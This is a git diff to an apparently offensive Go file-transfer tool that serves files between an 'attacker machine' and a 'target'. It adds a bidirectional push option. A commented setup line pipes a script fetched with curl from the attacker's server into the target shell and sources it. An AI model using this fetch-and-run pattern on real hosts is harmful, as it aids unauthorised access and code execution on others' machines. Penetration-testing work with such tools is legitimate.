@@ -34,16 +34,18 @@ Launch an HTTP server to ease file sharing
   --secret                 provide the secret that will prefix URL paths. (by default: auto-generated)
   --dry-run                do not launch gitar server, only return command to load shortcuts
   --windows                specify that the target machine is a windows
+  -b                       bidirectionnal exchange: push file on target from the attacker machine without installiing anything on target
 
   -h, --help                  prints help information 
 `
 
 func main() {
-	var detectExternal, windows bool
+	var detectExternal, windows, bidirectional bool
 
 	serverIp := flag.String("e", "", "Server external reachable ip")
 	flag.BoolVar(&detectExternal, "ext", false, "Detect external ip and use it for gitar shortcut. If use with -e, the value of -e flag will be overwritten")
 	flag.BoolVar(&windows, "windows", false, "Target machine is a windows (copy paste windows shortcuts)")
+	flag.BoolVar(&bidirectional, "bidi", false, "Bidirectionnal exchange. You cna also push file on target from the attacker machine (without installign anything on target)")
 	port := flag.String("p", "9237", "Port to serve on")
 	dlDir := flag.String("d", ".", "Point to the directory of static file to serve")
 	upDir := flag.String("u", "./", "Point to the directory where file are uploaded")
@@ -85,7 +87,7 @@ func main() {
 
 	}
 
-	//Sercet generation
+	//Secret generation
 	if *secret == "" {
 		//generate random string
 		//*secret = encryption.GenerateRandom()
@@ -96,6 +98,36 @@ func main() {
 			b[i] = characters[rand.Intn(len(characters))]
 		}
 		*secret = string(b)
+	}
+
+	//bidirectional
+	var mktempDir string
+	if bidirectional {
+		mktemp, err := exec.Command("mktemp", "-d").Output()
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			//Configure bidi directory
+			mktempDir = strings.ReplaceAll(string(mktemp), "\n", "")
+
+			//Configure alias for host
+			alias, err := exec.Command("mktemp", "--suffix=gitar").Output()
+			if err != nil {
+				fmt.Println(err)
+			} else {
+				aliasFile := strings.ReplaceAll(string(alias), "\n", "")
+				hostAliases := `
+				push(){
+					cp $1 ` + mktempDir + ` 
+				}
+				`
+				err = os.WriteFile(string(aliasFile), []byte(hostAliases), 0644)
+				if err != nil {
+					log.Fatal(err)
+				}
+			}
+
+		}
 	}
 
 	//Url construction
@@ -115,7 +147,7 @@ func main() {
 		url = protocol + ip + ":" + p + "/" + *secret
 	}
 
-	cfg := &config.Config{ServerIP: *serverIp, Port: *port, DownloadDir: *dlDir, UploadDir: *upDir + "/", IsCopied: *copyArg, Tls: *tls, Url: url, Completion: *completion, Secret: *secret}
+	cfg := &config.Config{ServerIP: *serverIp, Port: *port, DownloadDir: *dlDir, UploadDir: *upDir + "/", IsCopied: *copyArg, Tls: *tls, Url: url, Completion: *completion, Secret: *secret, BidirectionnalDir: mktempDir}
 
 	//Set up messages
 	//setUpMsgLinux := "curl -s " + url + "/alias > /tmp/alias && . /tmp/alias && rm /tmp/alias"
@@ -125,7 +157,7 @@ func main() {
 	if windows {
 		setUpMsg = setUpMsgWindows
 	}
-	fmt.Println(cfg.Secret)
+
 	if !*noRun {
 		fmt.Println("Set up gitar exchange on remote:")
 	}
